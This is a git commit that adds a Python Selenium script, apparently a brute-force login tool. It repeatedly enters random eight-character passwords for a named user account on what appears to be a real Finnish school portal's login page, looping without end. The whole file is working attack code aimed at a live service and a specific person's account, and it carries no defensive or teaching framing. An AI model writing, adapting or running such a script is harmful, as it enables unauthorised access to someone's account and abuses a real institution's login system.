dfe86d85369230646d965f7c98d6496d1cb1cd64
hugets2009 <111659082+hugets2009@users.noreply.github.com>
2022-08-21 13:02:11 +0300

    Add files via upload

---
+++ brute/soir.py
@@ -0,0 +1,43 @@
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import time
+import random
+
+i = 0
+
+aakkoset = "012356789abcdefghijklmnopqrstuväö"
+isotk = "ABCDEFGHIJKLMNOPQRSTUVÄÖ"
+
+selain = webdriver.Chrome()
+palli = webdriver.Chrome()
+selain.get("https://rovaniemi.inschool.fi/?loginfailed")
+kirjoitus = selain.find_element_by_id("login-frontdoor")
+salasana = selain.find_element_by_id("password")
+    
+kirjoitus.send_keys("hugo.mattila@roiedu.fi")
+salasana.send_keys(random.choice(isotk))
+salasana.send_keys(random.choice(aakkoset))
+salasana.send_keys(random.choice(aakkoset))
+salasana.send_keys(random.choice(aakkoset))
+salasana.send_keys(random.choice(aakkoset))
+salasana.send_keys(random.choice(aakkoset))
+salasana.send_keys(random.choice(aakkoset))
+salasana.send_keys(random.choice(aakkoset))
+time.sleep(0.1)
+salasana.send_keys(Keys.RETURN)
+time.sleep(1)
+
+while i < 1:
+    kirjoitus = selain.find_element_by_id("login-frontdoor")
+    salasana = selain.find_element_by_id("password")
+    kirjoitus.send_keys("hugo.mattila@roiedu.fi")
+    salasana.send_keys(random.choice(isotk))
+    salasana.send_keys(random.choice(aakkoset))
+    salasana.send_keys(random.choice(aakkoset))
+    salasana.send_keys(random.choice(aakkoset))
+    salasana.send_keys(random.choice(aakkoset))
+    salasana.send_keys(random.choice(aakkoset))
+    salasana.send_keys(random.choice(aakkoset))
+    salasana.send_keys(random.choice(aakkoset))
+    time.sleep(0.1)
+    salasana.send_keys(Keys.RETURN)
